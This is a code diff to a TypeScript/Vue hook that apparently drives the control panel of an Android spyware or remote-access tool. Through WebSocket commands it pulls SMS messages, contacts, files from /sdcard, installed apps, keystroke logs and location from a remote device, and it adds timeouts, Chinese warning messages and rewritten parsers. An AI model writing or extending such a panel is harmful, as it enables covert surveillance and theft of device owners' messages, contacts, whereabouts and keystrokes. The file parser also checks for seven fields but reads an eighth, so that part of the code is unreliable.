@@ -14,10 +14,14 @@ import type {
 } from '@/types/device';
 
 type SendFunction = (message: WebSocketOutboundMessage) => boolean;
+type MessageApi = { warning: (content: string) => void };
+
+const REQUEST_TIMEOUT = 5000;
 
 export function useDeviceData(
     send: SendFunction,
-    deviceId: Ref<string>
+    deviceId: Ref<string>,
+    messageApi?: MessageApi
 ) {
     const loading = ref<DataLoadingState>({
         sms: false,
@@ -26,6 +30,9 @@ export function useDeviceData(
         apps: false,
         keylog: false,
     });
+
+    const locationLoading = ref(false);
+    const locationInfo = ref<LocationInfo | null>(null);
 
     const sendDataRequest = (
         params: Partial<DataRequestMessage>
@@ -41,16 +48,34 @@ export function useDeviceData(
 
     const fetchSms = () => {
         loading.value.sms = true;
+        setTimeout(() => {
+            if (loading.value.sms) {
+                loading.value.sms = false;
+                messageApi?.warning('获取短信超时，设备可能未授予权限或离线');
+            }
+        }, REQUEST_TIMEOUT);
         return sendDataRequest({ subc: 'SMS' });
     };
 
     const fetchContacts = () => {
         loading.value.contacts = true;
+        setTimeout(() => {
+            if (loading.value.contacts) {
+                loading.value.contacts = false;
+                messageApi?.warning('获取联系人超时，设备可能未授予权限或离线');
+            }
+        }, REQUEST_TIMEOUT);
         return sendDataRequest({ subc: 'Contacts' });
     };
 
     const fetchFiles = (path?: string) => {
         loading.value.files = true;
+        setTimeout(() => {
+            if (loading.value.files) {
+                loading.value.files = false;
+                messageApi?.warning('获取文件列表超时，设备可能未授予权限或离线');
+            }
+        }, REQUEST_TIMEOUT);
         return sendDataRequest({
             subc: 'files',
             filepath: path || '/sdcard',
@@ -59,11 +84,23 @@ export function useDeviceData(
 
     const fetchApps = () => {
         loading.value.apps = true;
+        setTimeout(() => {
+            if (loading.value.apps) {
+                loading.value.apps = false;
+                messageApi?.warning('获取应用列表超时，设备可能未授予权限或离线');
+            }
+        }, REQUEST_TIMEOUT);
         return sendDataRequest({ subc: 'LOADAPPS' });
     };
 
     const fetchKeylog = (date?: string) => {
         loading.value.keylog = true;
+        setTimeout(() => {
+            if (loading.value.keylog) {
+                loading.value.keylog = false;
+                messageApi?.warning('获取键盘记录超时，设备可能未授予权限或离线');
+            }
+        }, REQUEST_TIMEOUT);
         if (date) {
             return sendDataRequest({
                 subc: 'Logdate',
@@ -74,6 +111,13 @@ export function useDeviceData(
     };
 
     const fetchLocation = () => {
+        locationLoading.value = true;
+        setTimeout(() => {
+            if (locationLoading.value) {
+                locationLoading.value = false;
+                messageApi?.warning('获取位置超时，设备可能未授予权限或离线');
+            }
+        }, REQUEST_TIMEOUT);
         return sendDataRequest({ subc: 'loc' });
     };
 
@@ -142,6 +186,8 @@ export function useDeviceData(
 
     return {
         loading,
+        locationLoading,
+        locationInfo,
         fetchSms,
         fetchContacts,
         fetchFiles,
@@ -187,20 +233,20 @@ export function parseSmsData(data: string): SmsMessage[] {
 export function parseContactsData(data: string): Contact[] {
     if (!data) return [];
     const contacts: Contact[] = [];
+    const lines = data.trim().split('\n');
 
-    try {
-        const parsed = JSON.parse(data);
-        if (Array.isArray(parsed)) {
-            for (const item of parsed) {
-                contacts.push({
-                    name: item.name || item.Name || '',
-                    number: item.number || item.Number || item.phone || '',
-                });
-            }
-        }
-    } catch {
-        const lines = data.trim().split('\n');
-        for (const line of lines) {
+    for (const line of lines) {
+        if (!line.trim()) continue;
+
+        try {
+            // 尝试 JSON 格式
+            const parsed = JSON.parse(line);
+            contacts.push({
+                name: parsed.name || parsed.Name || '',
+                number: parsed.number || parsed.Number || parsed.phone || '',
+            });
+        } catch {
+            // 回退到分隔符格式: "姓名[>A<]号码"
             const parts = line.split('[>A<]');
             if (parts.length >= 2) {
                 contacts.push({
@@ -222,14 +268,13 @@ export function parseFilesData(data: string): FileItem[] {
     for (const item of items) {
         if (!item.trim()) continue;
         const parts = item.split('[>A<]');
-        if (parts.length >= 4) {
+        if (parts.length >= 7) {
             files.push({
-                name: parts[0] || '',
-                size: parts[1] || '0',
-                path: parts[2] || '',
-                lastModified: parts[3] || '',
-                isDirectory: parts[4] === '1' || parts[4] === 'true',
-                imageSrc: parts[5] || undefined,
+                name: parts[2] || '',
+                size: parts[3] || '0',
+                path: parts[4] || '',
+                lastModified: parts[5] || '',
+                isDirectory: parts[7] === '1',
             });
         }
     }
